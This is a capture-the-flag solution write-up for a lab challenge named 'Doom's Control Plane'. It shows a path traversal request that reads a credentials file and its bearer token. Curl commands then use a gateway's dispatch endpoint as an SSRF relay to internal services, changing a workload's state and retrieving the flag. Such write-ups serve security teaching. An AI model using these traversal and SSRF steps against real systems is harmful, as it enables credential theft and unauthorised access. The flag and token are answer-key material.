# Solution: X06 — Doom's Control Plane

## Vulnerability & Concept Breakdown
This challenge focuses on exploiting a scoped internal orchestration identity within a synthetic workload control plane.

1. **Step 1: Credential Discovery & Recovery**
   - Access the public web portal at `http://<TARGET_HOST>:80`.
   - The diagnostic log viewer endpoint `/api/diagnostics/log?file=...` allows reading files within the challenge tree.
   - Reading `operator.log` reveals:
     `[OPERATOR-DAEMON] [INFO] Scoped control plane token loaded from /app/challenge/credentials/operator_credentials.json`
   - Requesting `/api/diagnostics/log?file=../../credentials/operator_credentials.json` yields:
     ```json
     {
       "system": "LATVERIA-DOOMS-CONTROL-PLANE-v1.4",
       "identity": "maintenance-bot-042",
       "role": "telemetry-operator",
       "control_token": "dcp_tok_maint_9a8f4c2e1b7d5e6a3c8f",
       "control_plane_url": "http://127.0.0.1:8081"
     }
     ```

2. **Step 2: API Discovery & Capability Enumeration**
   - Using the public mesh gateway `POST /api/mesh/dispatch`, send an authenticated introspect query to the internal Synthetic Control API:
     ```bash
     curl -s -X POST http://<TARGET_HOST>:80/api/mesh/dispatch \
          -H "Content-Type: application/json" \
          -d '{
            "url": "http://127.0.0.1:8081/api/v1/auth/introspect",
            "method": "GET",
            "headers": {"Authorization": "Bearer dcp_tok_maint_9a8f4c2e1b7d5e6a3c8f"}
          }'
     ```
   - The response confirms the scoped role:
     - Allowed: `["workloads:list", "workloads:inspect", "workloads:transition:prepare_maintenance", "workloads:scale", "workloads:activate:mesh"]`
     - Forbidden: `["cluster:admin", "secrets:read", "flag:direct_access"]`

3. **Step 3: Workload Inspection**
   - Query all synthetic workloads:
     ```bash
     curl -s -X POST http://<TARGET_HOST>:80/api/mesh/dispatch \
          -H "Content-Type: application/json" \
          -d '{
            "url": "http://127.0.0.1:8081/api/v1/workloads",
            "method": "GET",
            "headers": {"Authorization": "Bearer dcp_tok_maint_9a8f4c2e1b7d5e6a3c8f"}
          }'
     ```
   - We observe `sovereign-core-gateway` in `ISOLATED` state with 0 replicas.

4. **Step 4: Execute Workload State Transitions**
   - **Transition 1**: Prepare Maintenance (`ISOLATED` -> `STANDBY`):
     ```bash
     curl -s -X POST http://<TARGET_HOST>:80/api/mesh/dispatch \
          -H "Content-Type: application/json" \
          -d '{
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/transition",
            "method": "POST",
            "headers": {"Authorization": "Bearer dcp_tok_maint_9a8f4c2e1b7d5e6a3c8f"},
            "data": {"action": "prepare_maintenance"}
          }'
     ```

   - **Transition 2**: Scale Workload Replicas (0 -> 1):
     ```bash
     curl -s -X POST http://<TARGET_HOST>:80/api/mesh/dispatch \
          -H "Content-Type: application/json" \
          -d '{
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/scale",
            "method": "POST",
            "headers": {"Authorization": "Bearer dcp_tok_maint_9a8f4c2e1b7d5e6a3c8f"},
            "data": {"replicas": 1}
          }'
     ```

   - **Transition 3**: Activate Workload & Bind Route:
     ```bash
     curl -s -X POST http://<TARGET_HOST>:80/api/mesh/dispatch \
          -H "Content-Type: application/json" \
          -d '{
            "url": "http://127.0.0.1:8081/api/v1/workloads/sovereign-core-gateway/activate",
            "method": "POST",
            "headers": {"Authorization": "Bearer dcp_tok_maint_9a8f4c2e1b7d5e6a3c8f"},
            "data": {"target_state": "ACTIVE", "route": "internal_mesh"}
          }'
     ```

5. **Step 5: Reach Core Service & Retrieve Flag**
   - Send query to Sovereign Core Vault on `http://127.0.0.1:8083/core/vault`:
     ```bash
     curl -s -X POST http://<TARGET_HOST>:80/api/mesh/dispatch \
          -H "Content-Type: application/json" \
          -d '{
            "url": "http://127.0.0.1:8083/core/vault",
            "method": "GET"
          }'
     ```
   - Sovereign Core verifies the active workload with WMS, communicates with Flag Vault (`127.0.0.1:8084`), and returns:
     ```json
     {
       "status": "SUCCESS",
       "message": "Sovereign Core Vault unlocked successfully.",
       "core_identity": "LATVERIA-PRIME-CORE-WORKLOAD-001",
       "workload_status": "ACTIVE",
       "flag": "YUVA{synthet1c_c0ntr0l_pl4n3_sc0p3d_0rch3str4t10n_x06}"
     }
     ```
